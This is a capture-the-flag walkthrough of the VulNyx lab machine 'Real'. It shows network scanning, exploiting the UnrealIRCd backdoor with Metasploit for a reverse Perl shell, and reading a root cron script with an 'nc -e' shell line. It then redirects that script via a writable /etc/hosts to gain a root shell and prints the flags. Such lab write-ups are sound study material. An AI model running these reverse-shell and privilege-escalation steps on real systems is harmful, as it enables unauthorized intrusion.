# REAL - VulNyx

## Information
**Real** is a low-difficulty vulnerable Linux virtual machine from VulNyx platform, created by the user `d4t4s3c`, and it runs properly on VirtualBox.

## Solution
### Enumeration
We found the ip of the target machine within our network segment.
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ sudo arp-scan 192.168.100.0/24
[sudo] password for dungcngo: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:41:d9:1c, IPv4: 192.168.100.173
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	00:c8:96:93:86:48	(Unknown)
192.168.100.120	08:00:27:7b:10:e6	PCS Systemtechnik GmbH
192.168.100.144	04:ed:33:79:aa:db	Intel Corporate
192.168.100.143	b6:7e:93:42:e4:8f	(Unknown: locally administered)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.252 seconds (113.68 hosts/sec). 4 responded
```
The Real's IP address is 192.168.100.120.

**Nmap**/TCP:

Use Nmap to scan the ports on the Real's IP address (192.168.100.120).
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ nmap -n -Pn -sS -p- --min-rate 5000 192.168.100.120
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-23 02:48 EST
Nmap scan report for 192.168.100.120
Host is up (0.0021s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
6697/tcp open  ircs-u
8067/tcp open  infi-async
MAC Address: 08:00:27:7B:10:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 122.97 seconds
```
The host at 192.168.100.120 is up, with five services listening: ssh, http, irc, ircs-u and infi-async. All other ports are closed. 
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ nmap -sVC -p22,80,6667,6697,8067 192.168.100.120   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-23 03:01 EST
Nmap scan report for real.lan (192.168.100.120)
Host is up (0.0013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 db:28:2b:ab:63:2a:0e:d5:ea:18:8d:2f:6d:8c:45:2d (RSA)
|   256 cd:a1:c3:2e:20:f0:f3:f6:d3:9b:27:8e:9a:2d:26:11 (ECDSA)
|_  256 db:98:69:a5:8b:bd:05:86:16:3d:9c:8b:30:7b:a3:6c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:7B:10:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
```
Of the ports that we find open, 22, 80 and 6667 are the most interesting.

### Shell (server)
#### 6667/TCP (UnrealIRCd)
We detect that it is vulnerable with `nmap's irc-unrealircd-backdoor` NSE script.
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ nmap -p6667 --script="irc-unrealircd-backdoor" 192.168.100.120
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 09:07 EST
Nmap scan report for real.lan (192.168.100.120)
Host is up (0.0015s latency).

PORT     STATE SERVICE
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
MAC Address: 08:00:27:7B:10:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ searchsploit UnrealIRCd
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Executi | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stac | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execut | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service     | windows/dos/27407.pl
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
This command searches the Exploit Database (EDB) for exploits related to UnrealIRCd. `searchsploit` is a CLI interface to exploitdb that allows you to search for vulnerabilities in the local database.
#### Exploitation
**Important exploit**: `16922.rb` (Metasploit)

This is the most important find - a `backdoor` exploit in UnrealIRCd version 3.2.8.1. This version was distributed in 2009 with a `backdoor` embedded in the offical distribution. Through the exploit, we can connect to an IRC server via TCP and excecute any commnand.

**Exploit features***:
- Remote Code Execution (RCE) capability.
- A command in the format `AB; <command>` is sent to the IRC server via TCP.
- Metasploit module is available `exploit/unix/irc/unreal_ircd_3281_backdoor`.

Now we will implement this payload in `metasploit`. Let's run `metasploit`.
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ msfconsole
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > 
```
We configure parameters:
- `set RHOSTS 192.168.100.120`: IP address of the target machine.
- `set RPORT 6667`: IRC server port.
```bash
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.100.120
RHOSTS => 192.168.100.120
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667
RPORT => 6667
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port
                                       [,type:host:port][...]. Supported prox
                                       ies: sapni, socks4, socks5, http, sock
                                       s5h
   RHOSTS   192.168.100.120  yes       The target host(s), see https://docs.m
                                       etasploit.com/docs/using-metasploit/ba
                                       sics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```
This command `show payloads` shows what kind of shell can be obtained through the exploit.
```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```
Select reverse shell: `set PAYLOAD cmd/unix/reverse_perl`. Why `reverse_perl`? 
- Target machine connect back to you (good for firewalls).
- Provides shell via `Perl`.
- Works on most Linux systems.
- Lightweight, simple and easy to deploy.
```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD payload/cmd/unix/reverse_perl
PAYLOAD => cmd/unix/reverse_perl
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.100.173
LHOST => 192.168.100.173
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
LPORT => 4444
```
We configure listener:
- `set LHOST 192.168.100.173`: Our IP address (Kali machine).
- `set LPORT 4444`: Our port (shell comes here).

```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port
                                       [,type:host:port][...]. Supported prox
                                       ies: sapni, socks4, socks5, http, sock
                                       s5h
   RHOSTS   192.168.100.120  yes       The target host(s), see https://docs.m
                                       etasploit.com/docs/using-metasploit/ba
                                       sics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.173  yes       The listen address (an interface may be
                                     specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```
#### Reverse Shell
We successfully got a shell using all the settings we chose above the `exploit` command.
```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.100.173:4444 
[*] 192.168.100.120:6667 - Connected to 192.168.100.120:6667...
    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
    :irc.foonet.com NOTICE AUTH :*** Found your hostname
[*] 192.168.100.120:6667 - Sending backdoor command...
[*] Command shell session 1 opened (192.168.100.173:4444 -> 192.168.100.120:40232) at 2026-02-25 09:18:48 -0500

id ; hostname
uid=1000(server) gid=1000(server) groups=1000(server)
real
whoami
server
python3 -c 'import pty; pty.spawn("/bin/bash")'
server@real:~/irc/Unreal3.2$ 
```
We improved the shell to make the shell look more user-friendly.

### Privilege Escalation
#### Enumeration
We use `pspy` to monitor **tasks** and **processes** that may be running on the system. We download and install it on the target machine's shell.
```bash
server@real:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
...
pspy64              100%[===================>]   2.96M  5.45MB/s    in 0.5s    

2026-02-25 09:22:51 (5.45 MB/s) - ‘pspy64’ saved [3104768/3104768]
server@real:/tmp$ chmod +x pspy64
chmod +x pspy64
server@real:/tmp$ ls -la
ls -la
total 3068
drwxrwxrwt  9 root   root      4096 Feb 25 09:22 .
drwxr-xr-x 18 root   root      4096 May  3  2023 ..
drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .font-unix
drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .ICE-unix
-rwx------  1 server server 3104768 Jan 17  2023 pspy64
drwx------  3 root   root      4096 Feb 25 01:30 systemd-private-98207e7a531446d090c21774f08f40d7-apache2.service-Kp8xD9
drwx------  3 root   root      4096 Feb 25 01:30 systemd-private-98207e7a531446d090c21774f08f40d7-systemd-timesyncd.service-c1wOfT
drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .Test-unix
drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .X11-unix
drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .XIM-unix
```
We dectect that every minute the `root` user (UID=0) executes the `/opt/task` script.
```bash
server@real:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
...
2026/02/25 09:23:55 CMD: UID=0     PID=4      | 
2026/02/25 09:23:55 CMD: UID=0     PID=3      | 
2026/02/25 09:23:55 CMD: UID=0     PID=2      | 
2026/02/25 09:23:55 CMD: UID=0     PID=1      | /sbin/init 
2026/02/25 09:24:01 CMD: UID=0     PID=4999   | /usr/sbin/CRON -f 
2026/02/25 09:24:01 CMD: UID=0     PID=5000   | /usr/sbin/CRON -f 
2026/02/25 09:24:01 CMD: UID=0     PID=5001   | /bin/sh -c /opt/task 
2026/02/25 09:24:01 CMD: UID=0     PID=5002   | /bin/bash /opt/task 
2026/02/25 09:24:01 CMD: UID=0     PID=5003   | timeout 1 bash -c /usr/bin/ping -c 1 shelly.real.nyx 
2026/02/25 09:24:01 CMD: UID=0     PID=5004   | /bin/bash /opt/task 
2026/02/25 09:24:01 CMD: UID=0     PID=5005   | /bin/bash /opt/task 
```
We analyze `/opt/task` and see that it sends a ping to the **domain shelly.real.nyx**, if that domain is alive it will send a reverse shell to that domain through `port 65000/TCP`
```bash
server@real:/tmp$ cd /opt
cd /opt
server@real:/opt$ ls
ls
task
server@real:/opt$ cat task
cat task
#!/bin/bash

domain='shelly.real.nyx'

function check(){

        timeout 1 bash -c "/usr/bin/ping -c 1 $domain" > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
        exit 0
    else
        exit 1
    fi
}

check
```
#### Abuse
Using the following command, we can search for writable files.
```bash
server@real:~$ find / -type f -writable 2>/dev/null | grep -v "proc" | grep -v "sys"
<itable 2>/dev/null | grep -v "proc" | grep -v "sys"
/tmp/pspy64
/home/server/irc/Unreal3.2/networks/thainet.network
/home/server/irc/Unreal3.2/networks/l33t-irc.network
/home/server/irc/Unreal3.2/networks/awesomechristians.network
/home/server/irc/Unreal3.2/networks/makenet
/home/server/irc/Unreal3.2/networks/unitedirc-org.network
...
/home/server/irc/Unreal3.2/badwords.quit.conf
/home/server/.bashrc
/home/server/.profile
/home/server/.wget-hsts
/home/server/.selected_editor
/home/server/.bash_logout
/etc/hosts
```
We have write permissions on the `/etc/hosts` file.
```bash
server@real:/opt$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
1.2.3.4		real

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
We add the **domain shelly.real.nyx** to point to my local IP.
```bash
server@real:~$ echo '192.168.100.173 shelly.real.nyx' >> /etc/hosts
echo '192.168.100.173 shelly.real.nyx' >> /etc/hosts
server@real:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
1.2.3.4		real

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.100.173 shelly.real.nyx
```
We listen on `port 65000` and get a shell as `root`.
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
└─$ nc -lvnp 65000
listening on [any] 65000 ...
connect to [192.168.100.173] from (UNKNOWN) [192.168.100.120] 58418
id ; hostname
uid=0(root) gid=0(root) groups=0(root)
real
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@real:~#   
```
#### Flags
As a `root` user, we can read the flags `user.txt` and `root.txt`.
```bash
root@real:~# find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
3b7fb7c1c8737a5c67dc513657e3efb3
593ba7e2d1e66b12e1488d6ea30c8787
```

***You are welcome!***













